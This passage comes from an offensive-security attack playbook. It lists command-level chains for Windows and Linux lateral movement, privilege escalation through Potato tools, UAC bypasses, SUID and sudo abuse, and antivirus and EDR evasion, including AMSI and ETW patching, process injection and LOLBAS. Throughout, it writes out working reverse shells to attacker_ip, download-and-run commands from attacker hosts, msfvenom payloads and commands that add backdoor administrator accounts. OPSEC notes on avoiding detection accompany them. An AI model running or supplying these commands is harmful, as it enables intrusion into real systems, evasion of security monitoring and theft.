### SMBExec lateral movement  `lateral-smbexec`
Run commands over SMB
Subcategory: **SMB** · tags: `smb` `lateral` `exec`

**Preconditions:** SMB access; administrator privileges

**Attack chain:**

**1. Impacket smbexec**  _[linux]_
_Run a command with smbexec_
```
smbexec.py domain/user:password@target
```

**2. Execute via a service**  _[windows]_
_Create and start a service_
```
sc \\target create evilsvc binPath= "cmd /c whoami"
sc \\target start evilsvc
sc \\target delete evilsvc
```

---

### ATExec lateral movement  `lateral-atexec`
Run commands via a scheduled task
Subcategory: **Scheduled tasks** · tags: `at` `scheduled` `lateral`

**Preconditions:** scheduled-task rights; administrator privileges

**Attack chain:**

**1. Impacket atexec**  _[linux]_
_Run a command with atexec_
```
atexec.py domain/user:password@target "whoami"
```

**2. schtasks**  _[windows]_
_Create a remote scheduled task_
```
schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
```

---

### WinRS lateral movement  `lateral-winrs`
Run remote commands via WinRS
Subcategory: **WinRS** · tags: `winrs` `lateral` `windows`

**Preconditions:** WinRM enabled; valid credentials

**Attack chain:**

**1. Run a command**  _[windows]_
_Run a command remotely_
```
winrs -r:target -u:user -p:password "whoami"
```

**2. Get a shell**  _[windows]_
_Get a remote CMD shell_
```
winrs -r:target -u:user -p:password "cmd"
```

---

### Excel DCOM lateral movement  `lateral-dcom-excel`
Move laterally by abusing Excel DCOM
Subcategory: **DCOM** · tags: `dcom` `excel` `lateral`

**Preconditions:** Excel is installed on the target; DCOM rights

**Attack chain:**

**1. Activate the Excel DCOM object**  _[windows]_
_Activate the Excel DCOM object_
```
$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Visible = $false
```

**2. Run a command**  _[windows]_
_Run a command via Excel_
```
$obj.Workbooks.Add()
$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
$obj.Run("calc.exe")
```

**3. Impacket DCOM**  _[linux]_
_Execute with Impacket_
```
python dcomexec.py -object Excel.Application domain/user:password@target.com
```

---

### MMC DCOM lateral movement  `lateral-dcom-mmc`
Move laterally by abusing MMC DCOM
Subcategory: **DCOM** · tags: `dcom` `mmc` `lateral`

**Preconditions:** MMC is installed on the target; DCOM rights

**Attack chain:**

**1. MMC20.Application**  _[windows]_
_Run a command via MMC_
```
$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

**2. Impacket execution**  _[linux]_
_Use Impacket_
```
python dcomexec.py -object MMC20.Application domain/user:password@target.com
```

---

### RDP relay attack  `rdp-relay`
RDP relay attack techniques
Subcategory: **RDP** · tags: `rdp` `relay` `lateral`

**Preconditions:** the RDP service is reachable; NTLM authentication is in use

**Attack chain:**

**1. Set up the relay**  _[linux]_
_Set up an RDP relay server_
```
Using Impacket:
python ntlmrelayx.py -tf targets.txt -smb2support
Or use rdp_relay.py
```

**2. Coerce a connection**
_Coerce a user into connecting_
```
Coerce a user into connecting to an attacker-controlled RDP server:
1. Send a malicious RDP file
2. When the user connects, relay to the target
```

**3. PetitPotam combination**  _[linux]_
_PetitPotam + RDP Relay_
```
python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
Combine with an NTLM relay to attack AD CS
```

---

## Privilege escalation

### Token theft and impersonation  `privilege-token`
Steal and impersonate Windows access tokens
Subcategory: **Token manipulation** · tags: `token` `privilege` `impersonation` `windows`

**Preconditions:** you already have access to the target; SeImpersonatePrivilege; Windows system

**Attack chain:**

**1. List tokens**  _[windows]_
_List every available token on the system_
```
mimikatz.exe "privilege::debug" "token::list" "exit"
```

**2. Steal a token**  _[windows]_
_Steal a specific user's token_
```
mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"
```

**3. JuicyPotato attack**  _[windows]_
_JuicyPotato privilege escalation (requires SeImpersonatePrivilege)_
```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

**4. PrintSpoofer**  _[windows]_
_PrintSpoofer privilege escalation_
```
PrintSpoofer.exe -i -c cmd
```

**5. GodPotato**  _[windows]_
_GodPotato privilege escalation, supporting more Windows versions_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**EDR bypass variants:**

**1. RoguePotato**
_RoguePotato, bypassing more restrictions_
```
RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"
```

**Analysis:** a successful token theft lets you act as a higher-privileged user.

**OPSEC:** the Potato tools abuse DCOM; they require SeImpersonatePrivilege; different Windows versions need different CLSIDs

---

### Windows privilege escalation  `windows-privesc`
Windows privilege escalation techniques
Subcategory: **Windows** · tags: `privesc` `windows` `privilege`

**Preconditions:** ordinary user privileges; a system vulnerability

**Attack chain:**

**1. Check privilege-escalation vectors**  _[windows]_
_Check current privileges_
```
whoami /priv
whoami /groups
```

**2. Using WinPEAS**  _[windows]_
_Automated privilege-escalation checks_
```
winpeas.exe
```

**3. Check service permissions**  _[windows]_
_Check for writable services_
```
accesschk.exe -uwcqv "Everyone" *
```

**4. Check for unquoted service paths**  _[windows]_
_Find unquoted service paths_
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"  | findstr /i /v """
```

---

### Linux privilege escalation  `linux-privesc`
Linux privilege escalation techniques
Subcategory: **Linux** · tags: `privesc` `linux` `privilege`

**Preconditions:** ordinary user privileges; a system vulnerability

**Attack chain:**

**1. Check SUID**  _[linux]_
_Find SUID files_
```
find / -perm -4000 -type f 2>/dev/null
```

**2. Check sudo**  _[linux]_
_Check sudo permissions_
```
sudo -l
```

**3. Check cron**  _[linux]_
_Check scheduled tasks_
```
cat /etc/crontab
ls -la /etc/cron*
```

**4. Using LinPEAS**  _[linux]_
_Automated privilege-escalation checks_
```
linpeas.sh
```

---

### UAC bypass  `uac-bypass`
Bypass Windows User Account Control
Subcategory: **UAC** · tags: `uac` `bypass` `windows`

**Preconditions:** membership in the Administrators group; UAC enabled

**Attack chain:**

**1. Fodhelper**  _[windows]_
_Bypass UAC via fodhelper_
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
fodhelper.exe
```

**2. Eventvwr**  _[windows]_
_Bypass UAC via eventvwr_
```
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
eventvwr.exe
```

**3. Using UACME**  _[windows]_
_Use the UACME tool_
```
Akagi64.exe 23 cmd.exe
```

---

### DLL hijacking  `dll-hijack`
Escalate privileges via DLL hijacking
Subcategory: **DLL** · tags: `dll` `hijack` `privesc`

**Preconditions:** a writable directory; DLL search-order behavior

**Attack chain:**

**1. Find DLL hijacks**  _[windows]_
_Monitor DLLs loaded by processes_
```
Monitor DLL loading with Procmon
```

**2. Build a malicious DLL**  _[linux]_
_Generate a malicious DLL_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**3. Place the DLL**  _[windows]_
_Place the DLL in the target location_
```
copy evil.dll "C:\Program Files\VulnerableApp\missing.dll"
```

---

### Service privilege escalation  `service-exploit`
Escalate privileges via a service vulnerability
Subcategory: **Services** · tags: `service` `privesc` `windows`

**Preconditions:** rights to modify a service; a writable service path

**Attack chain:**

**1. Check service permissions**  _[windows]_
_Check which services the user can modify_
```
accesschk.exe -uwcqv "Users" *
```

**2. Modify the service path**  _[windows]_
_Change the service's executable path_
```
sc config VulnerableService binPath= "cmd /c whoami"
```

**3. Restart the service**  _[windows]_
_Restart the service to run the command_
```
sc stop VulnerableService
sc start VulnerableService
```

---

### AlwaysInstallElevated privilege escalation  `always-install`
Escalate privileges via AlwaysInstallElevated
Subcategory: **MSI** · tags: `msi` `alwaysinstall` `privesc`

**Preconditions:** AlwaysInstallElevated is enabled

**Attack chain:**

**1. Check the setting**  _[windows]_
_Check whether it is enabled_
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**2. Build an MSI**  _[linux]_
_Generate a malicious MSI_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
```

**3. Install the MSI**  _[windows]_
_Install the MSI to run code_
```
msiexec /quiet /qn /i evil.msi
```

---

### Juicy Potato privilege escalation  `juicy-potato`
Escalate privileges via COM objects and SeImpersonatePrivilege
Subcategory: **Potato** · tags: `juicy-potato` `com` `privesc`

**Preconditions:** SeImpersonatePrivilege; Windows earlier than 2019

**Attack chain:**

**1. Check privileges**  _[windows]_
_Check for SeImpersonatePrivilege_
```
whoami /priv | findstr SeImpersonate
```

**2. Run JuicyPotato**  _[windows]_
_Escalate privileges with JuicyPotato_
```
JuicyPotato.exe -t * -p cmd.exe -l 1337
```

---

### PrintSpoofer privilege escalation  `printspoofer`
Escalate privileges via the print spooler service
Subcategory: **PrintSpoofer** · tags: `printspoofer` `privesc` `windows`

**Preconditions:** SeImpersonatePrivilege

**Attack chain:**

**1. Run PrintSpoofer**  _[windows]_
_Escalate privileges with PrintSpoofer_
```
PrintSpoofer.exe -i -c cmd
```

**2. Specify a command**  _[windows]_
_Run a specified command_
```
PrintSpoofer.exe -c "whoami > C:\out.txt"
```

---

### GodPotato privilege escalation  `godpotato`
The GodPotato privilege-escalation tool
Subcategory: **GodPotato** · tags: `godpotato` `privesc` `windows`

**Preconditions:** SeImpersonatePrivilege

**Attack chain:**

**1. Run GodPotato**  _[windows]_
_Privilege escalation with GodPotato_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**2. Reverse Shell**  _[windows]_
_Execute a reverse shell_
```
GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"
```

---

### SUID Privilege Escalation  `suid-exploit`
Privilege escalation via SUID files
Subcategory: **SUID** · tags: `suid` `privesc` `linux`

**Preconditions:** A SUID file exists; an exploitable program

**Attack chain:**

**1. Find SUID**  _[linux]_
_Find all SUID files_
```
find / -perm -4000 -type f 2>/dev/null
```

**2. Common exploitable programs**  _[linux]_
_Common SUID exploitation methods_
```
nmap --interactive
vim -c ':!/bin/sh'
find / -exec /bin/sh \;
cp /bin/sh /tmp/sh; chmod +s /tmp/sh
```

**3. GTFOBins**  _[linux]_
_Find exploitation methods for a program_
```
Consult the GTFOBins website to find exploitable programs
```

---

### Sudo Privilege Escalation  `sudo-exploit`
Privilege escalation via Sudo configuration
Subcategory: **Sudo** · tags: `sudo` `privesc` `linux`

**Preconditions:** Misconfigured Sudo privileges

**Attack chain:**

**1. Check Sudo privileges**  _[linux]_
_List the sudo commands that can be run_
```
sudo -l
```

**2. Common exploitation**  _[linux]_
_Common sudo exploitation methods_
```
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
```

**3. CVE-2021-3156**  _[linux]_
_Baron Samedit vulnerability_
```
Exploit the sudo heap-overflow vulnerability
```

---

### Cron Privilege Escalation  `cron-exploit`
Privilege escalation via Cron jobs
Subcategory: **Cron** · tags: `cron` `privesc` `linux`

**Preconditions:** A writable Cron script; wildcard injection

**Attack chain:**

**1. Check Cron jobs**  _[linux]_
_View scheduled tasks_
```
cat /etc/crontab
ls -la /etc/cron*
```

**2. Check script permissions**  _[linux]_
_Check Cron script permissions_
```
ls -la /path/to/cron/script.sh
```

**3. Wildcard injection**  _[linux]_
_Exploit tar wildcard injection_
```
Create in the Cron directory: --checkpoint=1
--checkpoint-action=exec=sh shell.sh
```

---

### Kernel Exploit Privilege Escalation  `kernel-exploit`
Privilege escalation via kernel vulnerabilities
Subcategory: **Kernel** · tags: `kernel` `privesc` `exploit`

**Preconditions:** A kernel vulnerability exists; you can compile/run the exploit

**Attack chain:**

**1. Check kernel version**  _[linux]_
_View kernel version information_
```
uname -a
cat /proc/version
```

**2. Search for an exploit**  _[linux]_
_Search for a kernel exploit_
```
searchsploit kernel VERSION
```

**3. Common kernel vulnerabilities**  _[linux]_
_Common kernel privilege-escalation vulnerabilities_
```
DirtyCow (CVE-2016-5195)
DirtyPipe (CVE-2022-0847)
PwnKit (CVE-2021-4034)
```

---

### Potato-Family Privilege Escalation Attacks  `potato-attack`
Use Windows token impersonation and NTLM relay mechanisms to escalate from a service account (SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege) to SYSTEM
Subcategory: **Potato Privesc** · tags: `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`

**Preconditions:** Hold SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege; common on IIS AppPool, SQL Server, and various service accounts

**Attack chain:**

**1. Check current privileges**  _[windows]_
_First confirm whether the current user holds token-impersonation privileges. IIS application-pool accounts, SQL Server service accounts, and Windows service accounts usually hold this privilege by default_
```
# Check whether Impersonate privilege is held
whoami /priv

# Focus on the following privileges:
# SeImpersonatePrivilege - impersonate a client token
# SeAssignPrimaryTokenPrivilege - replace a process-level token

# Confirm the current user identity
whoami /all
echo %USERNAME%
```

**2. JuicyPotato (Windows Server 2016/2019)**  _[windows]_
_JuicyPotato uses a COM server and NTLM authentication to achieve token impersonation. It creates a local COM server, tricks the SYSTEM account into authenticating to it, then impersonates that token to execute commands_
```
# Download JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# Use JuicyPotato to escalate and run a command
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# Use a specific CLSID (different systems need different CLSIDs)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Reverse shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
```

**3. PrintSpoofer (Windows 10/Server 2019+)**  _[windows]_
_PrintSpoofer abuses the named-pipe impersonation feature of the Windows print service. It creates a named pipe and tricks the Print Spooler service into connecting, thereby obtaining a SYSTEM token. It works on newer Windows versions where JuicyPotato no longer works_
```
# PrintSpoofer - abuse the print-service named pipe
PrintSpoofer.exe -i -c cmd

# Directly execute a command
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# Reverse shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# Launch PowerShell as SYSTEM
PrintSpoofer.exe -i -c powershell.exe
```

**4. Sweet Potato (multi-technique integration)**  _[windows]_
_SweetPotato combines multiple techniques such as PrintSpoofer and EfsPotato, automatically selecting the attack method suited to the target system_
```
# SweetPotato - integrates multiple Potato techniques
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# Specify the attack method
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
```

**5. GodPotato (works on all versions)**  _[windows]_
_GodPotato exploits a flaw in the DCOM OXID resolver, requires no CLSID, and is compatible with almost all Windows versions. It is currently the most universal Potato variant_
```
# GodPotato - works on all Windows Server 2012-2022 versions
GodPotato.exe -cmd "cmd /c whoami"

# Execute a reverse shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# Add an administrator
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# Execute PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

**6. RoguePotato (remote scenario)**  _[windows]_
_RoguePotato is an improved version of JuicyPotato that relays NTLM authentication through a remote OXID resolver. It needs a helper attack machine to complete the relay_
```
# Attack machine - start socat redirection
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# Target machine - run RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# Or use a netcat reverse shell
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
```

**7. Potato selection decision flow**  _[windows]_
_Choose the appropriate Potato variant tool based on the target system version_
```
# === Decision flow ===
# 1. whoami /priv to confirm SeImpersonatePrivilege
# 2. systeminfo to confirm the system version
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (before 1809) => JuicyPotato (needs the correct CLSID)
# Windows 10/Server 2019+ => PrintSpoofer or GodPotato
# Windows Server 2022 => GodPotato
# All versions => SweetPotato (auto-select)
# Remote relay needed => RoguePotato
#
# Common CLSID lookup: https://ohpe.it/juicy-potato/CLSID/
```

**EDR bypass variants:**

**1. Potato tricks to bypass EDR detection**  _[windows]_
_Bypass EDR detection of Potato tools via reflective loading, renaming, using newer tools, and similar methods_
```
# 1. Rename the binary
ren GodPotato.exe svcutil.exe

# 2. Use .NET reflective loading (no file on disk)
powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";

# 3. Use SharpToken instead (newer tool, fewer signatures)
SharpToken.exe execute SYSTEM "cmd /c whoami"
```

**Analysis:** Potato-family attacks abuse the Windows token-impersonation mechanism: a service account holding SeImpersonatePrivilege can impersonate any user token that authenticates to it. The attacker tricks the SYSTEM account into authenticating to a local COM server / named pipe, obtains a SYSTEM token, and then creates a high-privilege process. This is one of the most common privilege-escalation methods on web servers (IIS) and databases (SQL Server).

**OPSEC:** 1) Potato tool binaries have obvious signatures; in-memory loading is recommended. 2) The named-pipe names created may be monitored. 3) Clean up tools and temporary files immediately after success. 4) Avoid sensitive commands like net user; use stealthier post-exploitation methods instead.

---

## AV evasion

### PowerShell AV Evasion  `evasion-powershell`
PowerShell script AV-evasion techniques
Subcategory: **PowerShell** · tags: `powershell` `evasion` `obfuscation`

**Preconditions:** Access to the target machine; Windows system

**Attack chain:**

**1. Encoded execution**  _[windows]_
_Execute via Base64 encoding_
```
powershell -enc BASE64_ENCODED_COMMAND
```

**2. Remote loading**  _[windows]_
_Load a script remotely_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")
```

**3. Obfuscate variable names**  _[windows]_
_Variable-name obfuscation_
```
1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"
```

**4. Fileless execution**  _[windows]_
_Hidden window, no profile execution_
```
powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/script.ps1\")"
```

**EDR bypass variants:**

**1. Downgrade execution**
_Use PowerShell v2 to bypass logging_
```
powershell -version 2 -c "command"
```

**Analysis:** PowerShell AV evasion can bypass antivirus detection to execute malicious scripts.

**OPSEC:** PowerShell logs may record commands; consider disabling logging; use obfuscation techniques

---

### AMSI Bypass  `amsi-bypass`
Bypass the Antimalware Scan Interface
Subcategory: **AMSI Bypass** · tags: `amsi` `bypass` `evasion`

**Preconditions:** PowerShell environment; AMSI enabled

**Attack chain:**

**1. Reflection bypass**  _[windows]_
_Disable AMSI via reflection_
```
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

**2. Memory patching**  _[windows]_
_Obfuscated-version bypass_
```
$a=[Ref].Assembly.GetTypes();ForEach($x in $a){if($x.Name -like "*iUtils"){$z=$x}};$y=$z.GetFields("NonPublic,Static");ForEach($x in $y){if($x.Name -like "*itFailed"){$x.SetValue($null,$true)}}
```

**3. DLL hijacking**  _[windows]_
_Bypass via DLL hijacking_
```
Replace or hijack amsi.dll
```

**4. Use a tool**  _[windows]_
_Use a ready-made tool_
```
Import-Module .\AmsiBypass.ps1
Invoke-AmsiBypass
```

---

### ETW Patch bypass  `etw-patch`
Disable ETW monitoring
Subclass: **ETW** · tags: `etw` `bypass` `evasion`

**Prerequisites:** code execution privileges

**Attack chain:**

**1. Disable ETW via PowerShell**  _[windows]_
_Disable ETW via PowerShell_
```
[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)
or
[Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Tracing") | Out-Null
$etw = [System.Diagnostics.Tracing.EventProvider]::new([Guid]::NewGuid())
$etw.SetEnabled(0)
```

**2. Disable ETW via C#**  _[windows]_
_Disable ETW via C#_
```
Assembly.Load("System.Diagnostics.Tracing")
Type etwType = typeof(EventProvider)
MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)
setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })
```

**3. Patch ntdll**  _[windows]_
_Patch EtwEventWrite_
```
$ntdll = [Win32.Kernel32]::LoadLibrary("ntdll.dll")
$etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
[Win32.Kernel32]::VirtualProtect($etwEventWrite, [uint32]1, 0x40, [ref]$oldProtect)
[Win32.Kernel32]::WriteProcessMemory(-1, $etwEventWrite, [byte[]](0xC3), 1, [ref]$bytesWritten)
```

---

### API Unhooking  `api-unhooking`
Remove EDR API hooks
Subclass: **Unhooking** · tags: `unhooking` `hook` `evasion`

**Prerequisites:** code execution privileges

**Attack chain:**

**1. Restore from disk**  _[windows]_
_Read a clean DLL from disk_
```
$ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$base = $proc.MainModule.BaseAddress
# Locate the .text section and overwrite it
```

**2. Restore from KnownDlls**  _[windows]_
_Restore from KnownDlls_
```
$section = [Win32.Kernel32]::OpenFileMapping(0x4, $false, "\KnownDlls\ntdll.dll")
$map = [Win32.Kernel32]::MapViewOfFile($section, 0x4, 0, 0, 0)
# Copy the clean code section
```

**3. Hell's Gate**  _[windows]_
_Hell's Gate technique_
```
Call directly via the syscall number:
1. Parse NTDLL to obtain the syscall number
2. Execute the syscall directly
3. Bypass user-mode hooks
```

---

### Process injection  `process-injection`
Inject code into another process
Subclass: **Process injection** · tags: `injection` `process` `evasion`

**Prerequisites:** code execution privileges

**Attack chain:**

**1. Classic DLL injection**  _[windows]_
_DLL injection_
```
$proc = Get-Process -Name notepad
$handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
$addr = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x40)
[Win32.Kernel32]::WriteProcessMemory($handle, $addr, $dllPath, $dllPath.Length, [ref]0)
[Win32.Kernel32]::CreateRemoteThread($handle, 0, 0, $loadLibraryAddr, $addr, 0, [ref]0)
```

**2. Process Hollowing**  _[windows]_
_Process hollowing_
```
1. CreateProcess(CREATE_SUSPENDED)
2. NtUnmapViewOfSection
3. VirtualAllocEx
4. WriteProcessMemory
5. ResumeThread
```

**3. APC injection**  _[windows]_
_APC queue injection_
```
$threadId = $proc.Threads[0].Id
$queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")
[Win32.Kernel32]::QueueUserAPC($queueAPC, $handle, $addr)
```

---

### AppLocker bypass  `applocker-bypass`
Bypass AppLocker application restrictions
Subclass: **AppLocker** · tags: `applocker` `bypass` `evasion`

**Prerequisites:** AppLocker-restricted environment

**Attack chain:**

**1. Use whitelisted paths**  _[windows]_
_Use whitelisted executables_
```
C:\Windows\System32\spoolsv.exe
C:\Windows\System32\svchost.exe
C:\Program Files\Internet Explorer\ieexec.exe
```

**2. LOLBAS abuse**  _[windows]_
_LOLBAS techniques_
```
regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
mshta.exe http://attacker.com/shell.hta
certutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe
```

**3. InstallUtil**  _[windows]_
_InstallUtil bypass_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```

**4. MSBuild**  _[windows]_
_Execute code via MSBuild_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.csproj
```

---

### BlockDLLs technique  `evasion-blockdlls`
Block non-Microsoft DLLs from loading
Subclass: **BlockDLLs** · tags: `evasion` `blockdlls` `edr`

**Preconditions:** Windows system; Cobalt Strike or another tool

**Attack chain:**

**1. Cobalt Strike BlockDLLs**  _[windows]_
_Enable BlockDLLs_
```
beacon> blockdlls start
Block non-Microsoft-signed DLLs from loading
beacon> blockdlls stop
Restore DLL loading
```

**2. Enable at process creation**  _[windows]_
_Enable at process creation_
```
Create the process with the CREATE_SUSPENDED flag
Set ProcessSignaturePolicy
Block EDR DLL injection
```

**3. C# implementation**  _[windows]_
_C# implementation of BlockDLLs_
```
[DllImport("kernel32.dll")]
static extern bool SetProcessMitigationPolicy(...);
ProcessSignaturePolicy policy = new ProcessSignaturePolicy();
policy.SignatureLevel = 0x0F;
SetProcessMitigationPolicy(ProcessMitigationPolicy.Signature, ref policy, size);
```

---

### Shellcode encryption  `evasion-shellcode-encrypt`
Encrypt shellcode to bypass static detection
Subclass: **Shellcode encryption** · tags: `evasion` `shellcode` `encrypt`

**Preconditions:** shellcode; an encryption tool

**Attack chain:**

**1. AES-encrypt the shellcode**
_AES encryption_
```
Encrypt with a tool:
python shellcode_encoder.py --input shellcode.bin --output encoded.bin --key randomkey
Produces the encrypted shellcode and decryption code
```

**2. XOR encryption**
_XOR encryption_
```
Simple XOR encryption:
for i in range(len(shellcode)):
    encoded[i] = shellcode[i] ^ key[i % len(key)]
Decrypt and execute at runtime
```

**3. RC4 encryption**
_RC4 encryption_
```
Encrypt the shellcode with RC4:
from Crypto.Cipher import ARC4
cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)
Decrypt at runtime with the same key
```

**4. Polymorphic encryption**
_Polymorphic encryption_
```
Generate different decryption code each time:
- Random key
- Random decryption order
- Add junk instructions
- Control-flow obfuscation
```

---

### Process masquerading  `evasion-process-masq`
Disguise the process name and path
Subclass: **Process masquerading** · tags: `evasion` `process` `masquerade`

**Preconditions:** Windows system

**Attack chain:**

**1. PPID spoofing**  _[windows]_
_PPID spoofing_
```
Cobalt Strike:
beacon> ppid 1234
Set the parent process ID to a legitimate process
beacon> run [command]
The new process inherits the legitimate parent process
```

**2. Process argument spoofing**  _[windows]_
_Argument spoofing_
```
CreateProcess arguments:
- lpApplicationName: path to a legitimate program
- lpCommandLine: contains the malicious command
- Displays as a legitimate process
```

**3. Process hollowing**  _[windows]_
_Process hollowing_
```
1. Create a legitimate process (suspended)
2. Write the malicious code
3. Resume thread execution
The process name displays as the legitimate program
```

---

### PPID spoofing  `evasion-ppid-spoof`
Forge the parent process ID
Subclass: **PPID spoofing** · tags: `evasion` `ppid` `spoofing`

**Preconditions:** Windows system; a handle to the parent process

**Attack chain:**

**1. PowerShell implementation**  _[windows]_
_PowerShell PPID spoofing_
```
$parent = Get-Process -Name explorer
$pi = New-Object System.Diagnostics.ProcessStartInfo
$pi.FileName = "cmd.exe"
$pi.ParentProcessId = $parent.Id
[System.Diagnostics.Process]::Start($pi)
```

**2. C# implementation**  _[windows]_
_C# implementation_
```
[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX {
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}
Uses the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
```

**3. Cobalt Strike**  _[windows]_
_Cobalt Strike implementation_
```
beacon> ppid [explorer_pid]
beacon> run notepad.exe
The new process's parent is explorer.exe
```

---

### DLL side-loading  `evasion-dll-sideloading`
Abuse DLL search order to load a malicious DLL
Subclass: **DLL side-loading** · tags: `evasion` `dll` `sideloading`

**Preconditions:** Windows system; an executable

**Attack chain:**

**1. DLL hijacking**  _[windows]_
_DLL hijacking principle_
```
1. Find a DLL loaded by the executable
2. Place the malicious DLL earlier in the search path
3. The malicious DLL loads when the program runs
```

**2. DLL proxying**  _[windows]_
_DLL proxying_
```
#pragma comment(linker, "/export:OriginalFunction=original.dll.OriginalFunction")
Export the original DLL's functions
While also executing the malicious code
```

**3. Common targets**  _[windows]_
_Common target DLLs_
```
Common DLL hijacking targets:
- version.dll
- dwmapi.dll
- uxtheme.dll
- cryptsp.dll
- winmm.dll
```

---

### Argument spoofing  `evasion-arg-spoofing`
Spoof the displayed process arguments
Subclass: **Argument spoofing** · tags: `evasion` `argument` `spoofing`

**Preconditions:** Windows system

**Attack chain:**

**1. Command-line spoofing**  _[windows]_
_Command-line spoofing_
```
CreateProcess arguments:
lpApplicationName = "C:\Windows\System32\cmd.exe"
lpCommandLine = "C:\Windows\System32\cmd.exe /c whoami"
The actual malicious command still executes
```

**2. Environment-variable spoofing**  _[windows]_
_Environment-variable spoofing_
```
Hide the argument in an environment variable:
set EVIL=malicious_command
cmd /c %EVIL%
The process list does not show the real command
```

**3. PEB modification**  _[windows]_
_PEB modification_
```
Modify the command line in the PEB:
1. Create the process
2. Modify the CommandLine buffer in the PEB
3. Process manager displays the fake argument
```

---

### Signed-binary abuse  `evasion-signed-binary`
Execute code via Microsoft-signed binaries
Subclass: **Signed binaries** · tags: `evasion` `signed` `lolbin`

**Preconditions:** Windows system

**Attack chain:**

**1. MSBuild**  _[windows]_
_MSBuild execution_
```
msbuild.exe malicious.csproj
Executes embedded C# code
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

**2. InstallUtil**  _[windows]_
_InstallUtil execution_
```
InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
Executes a .NET assembly
